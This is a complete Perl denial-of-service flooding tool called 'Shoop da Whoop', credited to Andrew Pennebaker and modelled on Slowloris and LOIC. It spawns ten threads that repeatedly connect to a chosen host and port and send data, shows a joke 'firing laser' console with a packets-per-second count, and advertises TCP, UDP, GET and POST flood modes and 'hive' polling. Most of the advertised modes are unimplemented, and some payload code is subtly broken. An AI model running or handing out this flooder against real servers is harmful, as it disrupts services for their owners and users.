#!/usr/bin/env perl
#
# Shoop da Whoop
# Andrew Pennebaker
#
# Based on Slowloris and LOIC
# http://ha.ckers.org/slowloris/
# https://github.com/NewEraCracker/LOIC

use strict;
use warnings;

use threads;
use threads::shared;
use Term::ReadKey qw(ReadMode);
use IO::Socket::INET;
use Socket qw(IPPROTO_TCP TCP_NODELAY);
use Number::Format;
use Getopt::Long;

require POSIX unless $^O !~/linux|darwin/;

# Curses::UI and Term::Screen fail to compile for ActiveState Perl
use Games::Roguelike::Console;

sub usage {
  print "Usage: $0 [host[:port]]\n\n";

  print "Port defaults to 80.\n";
  print "If no host is provided, the hive will be polled.\n\n";

  print "--delay -d sec\tPause between floods\n";
  print "--auto -a [sec]\tPoll hive with optional delay\n";
  print "--tcp -t\tTCP SYN/ACK flood (default)\n";
  print "--udp -u\tUDP flood\n";
  print "--get -g\tGET flood\n";
  print "--post -p\tPOST flood\n";
  print "--block -b\tDo not wait for reply\n";
  print "--help -h\tUsage information\n";

  exit 1;
}

$SIG{PIPE} = 'IGNORE';          # ignore broken pipes

srand;

our $con;

our $HIVE_QUERY = "http://search.twitter.com/search.atom?q=loic";
our $TCP_TIMEOUT = 9001;        # sec
our $MAX_THREADS = 10;
our $PACKETS :shared = 0;
our $FORMATTER = new Number::Format;

our $tcp = 1;
our $udp = 0;
our $get = 0;
our $post = 0;
our $delay = 0;                 # sec
our $poll = 600;                # sec
our $host = "";
our $port = 80;
our $block = 0;

my $result = GetOptions(
                        "tcp|t" => \$tcp,
                        "udp|u" => \$udp,
                        "get|g" => \$get,
                        "post|p" => \$post,
                        "delay|d=i" => \$delay,
                        "auto|a:i" => sub { $poll = shift @_ or 600000; }, # ms
                        "block|b" => \$block,
                        "help|h" => \&usage,
                        "<>" => sub {
                          my @parts = split(/:/, shift @_);

                          $host = shift @parts;

                          if ($#parts == 0) {
                            $port = shift @parts;
                            usage unless $port > 0 && $port < 65536;
                          }
                        }
                       );

usage unless $result;

usage unless ($host ne "" && $port); # until hive functionality is added

our $alive :shared = 1;

sub flood {
  my $sock;

  while ($alive) {
    if (!defined $sock || !$sock) {
      $sock = new IO::Socket::INET(
                                   PeerAddr => $host,
                                   PeerPort => $port,
                                   Timeout => $TCP_TIMEOUT,
                                   Proto => "tcp",
                                   Blocking => $block
                                  );
    }

    if ($sock) {
      my $payload="";

      if ($tcp) {
        setsockopt $sock, IPPROTO_TCP, TCP_NODELAY, 1;
        $payload = map { chr(65 + rand(26)) } 0..6;
      }

      print $sock $payload;

      if ($SIG{__WARN__}) {
        close $sock;
      } else {
        if ($tcp) {
          $PACKETS += 4;
        } else {
          $PACKETS++;
        }
      }
    }

    sleep $delay;
  }
}

# Games::Rogulelike and Curses do not quit properly.
sub restore_console {
  $alive = 0;

  if (defined $con) {
    undef $con;
  }

  # Allow terminal echo
  if ($^O =~ /linux|darwin/) {
    my $tty = POSIX::ttyname(1);

    # Restore POSIX terminal
    #
    # icanon handles special characters
    # echo displays typed keys
    # iutf8 allows history
    #
    if ($^O =~ /darwin/) {
      system "stty -f $tty icanon echo iutf8";
    } else {
      system "stty -F $tty icanon echo iutf8";
    }

    # Show the cursor
    print "\e[?25h";
  }

  exit 0;
}

# In case $con is undefined
sub safe_addstr {
  my $x = shift @_;
  my $y = shift @_;
  my $str = shift @_;

  if (defined $con) {
    $con->addstr($x, $y, $str);
  }
}

# In case $con is undefined
sub safe_refresh {
  if (defined $con) {
    $con->refresh;
  }
}

sub blargh {
  my $m = "BLAAAAAAAAAARGH!";

  $m = shift @_ unless ($#_ != 0);

  safe_addstr(2, 2, uc($m));
  safe_refresh;

  #print $m . "\n"; # debugging
}

sub shoop {
  # Console::ANSI works better for *nix
  if ($^O =~ /linux|darwin/) {
    $con = Games::Roguelike::Console::ANSI->new;
  } else {
    $con = Games::Roguelike::Console->new;
  }

  # Force hide the cursor for *nix
  print "\e[?25l" unless ($^O !~ /linux|darwin/);

  my $width = $con->{winx};
  
  my $filler = "~" x ($width - 3);

  # Console overwrites signal handlers.
  $SIG{INT} = \&restore_console;

  safe_addstr(0, 1, "O");
  safe_addstr(0, 2, "_");
  safe_addstr(0, 3, "o");
  safe_addstr(1, 1, "/");
  safe_addstr(2, 0, "|");
  safe_addstr(3, 1, "\\_");
  blargh "IMMA\' FIRIN\' MAH LAZER!";
  safe_addstr(5, 0, "Press Control+C to quit.");
  safe_refresh;

  my $startt = time;

  map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;

  my $interval = 0;

  my $pps = 0;

  # Prevent division by zero in pps calculation.
  while ($alive && $interval < 1) {
    $interval = time - $startt;
  }

  safe_addstr(1, 3, $filler);
  blargh " " x ($width - 3);
  safe_addstr(3, 3, $filler);
  safe_refresh;

  while ($alive) {
    $interval = time - $startt;

    $pps = $FORMATTER->format_number(int($PACKETS / $interval));
    blargh "SENDING $pps PACKETS/SEC";
  }
}

shoop;
